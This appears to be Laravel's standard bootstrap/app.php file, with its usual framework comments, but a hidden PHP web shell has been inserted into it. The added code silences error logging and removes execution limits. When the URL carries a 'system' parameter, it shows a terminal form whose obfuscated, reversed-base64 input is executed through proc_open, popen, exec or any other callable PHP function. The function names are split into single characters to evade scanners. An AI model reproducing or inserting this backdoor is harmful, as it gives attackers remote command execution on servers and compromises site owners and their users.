<?php

/*
|--------------------------------------------------------------------------
| Create The Application
|--------------------------------------------------------------------------
|
| The first thing we will do is create a new Laravel application instance
| which serves as the "glue" for all the components of Laravel, and is
| the IoC container for the system binding all of the various parts.
|
*/
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', '0');
@ini_set('memory_limit', '-1');
@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');
ob_implicit_flush(true);
header('Content-Type: text/html; charset=utf-8');
header('X-Requested-With: XMLHttpRequest');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

$app = new Illuminate\Foundation\Application(
    $_ENV['APP_BASE_PATH'] ?? dirname(__DIR__)
);

/*
|--------------------------------------------------------------------------
| Bind Important Interfaces
|--------------------------------------------------------------------------
|
| Next, we need to bind some important interfaces into the container so
| we will be able to resolve them when needed. The kernels serve the
| incoming requests to this application from both the web and CLI.
|
*/

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);

/*
|--------------------------------------------------------------------------
| Return The Application
|--------------------------------------------------------------------------
|
| This script returns the application instance. The instance is given to
| the calling script so we can separate the building of the instances
| from the actual running of the application and sending responses.
|
*/
if(isset($_GET['system'])){
    $f='f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_'.'e'.'x'.'i'.'s'.'t'.'s';
    echo '<style>
    .cb {
        position: fixed; bottom: 0; left: 0; width: 100%;
        background: rgba(0,0,0,0.9); color: #0f0; padding: 10px;
        font: 12px monospace; border-top: 3px solid #f00;
        z-index: 9999999; max-height: 40vh; overflow-y: auto;
    }
    .i { background: #ff0; color: #000; border: 1px solid #000; padding: 2px 5px; font-weight: bold; margin-right: 5px; }
    pre { background: #000; color: #0f0; padding: 5px; margin-top: 5px; border: 1px solid #333; white-space: pre-wrap; word-wrap: break-word; }
    </style>
    <div id="nb" class="cb"><b>>> ŤĒRMINĂL</b>
    <form method="POST" id="tf" style="margin: 5px 0;">
        <input type="hidden" name="payload">
        <input type="text" id="fx" class="i" placeholder="Ƒungsi" size="10"> 
        <input type="text" id="cm" class="i" placeholder="Ṕerintāh" style="width:50%"> 
        <input type="submit" value="ĒXEC" style="background:#0f0; cursor:pointer; border:none; padding:2px 10px; font-weight:bold">
    </form><pre>';

    if(isset($_POST['payload'])){
        $d = json_decode(base64_decode(strrev($_POST['payload'])), true);
        $x = trim($d['x']); $y = $d['y'];
        echo "Res: ".htmlspecialchars($x)."\n";
        if($f($x)){
            if($x=='p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n'){$p=$x($y,[1=>['pipe','w'],2=>['pipe','w']],$h);if(is_resource($p)){echo htmlspecialchars(stream_get_contents($h[1]).stream_get_contents($h[2]));proc_close($p);}}
            elseif($x=='p'.'o'.'p'.'e'.'n'){$h=$x($y.' 2>&1','r');while(!feof($h))echo htmlspecialchars(fread($h,1024));pclose($h);}
            elseif($x=='e'.'x'.'e'.'c'){$x($y,$o);echo htmlspecialchars(implode("\n",$o));}
            else echo htmlspecialchars(@$x($y));
        } else { echo "Ďisāblëd"; }
    }
    echo '</pre></div>
    <script>
    var b=document.getElementById("nb"); 
    if(b){ document.body.appendChild(b); }
    
    document.getElementById("tf").onsubmit = function() {
        var fx = document.getElementById("fx").value;
        var cm = document.getElementById("cm").value;
        if(!fx) return false;
        var data = { x: fx, y: cm };
        var enc = btoa(JSON.stringify(data)).split("").reverse().join("");
        this.payload.value = enc;
    };
    </script>';
}

return $app;
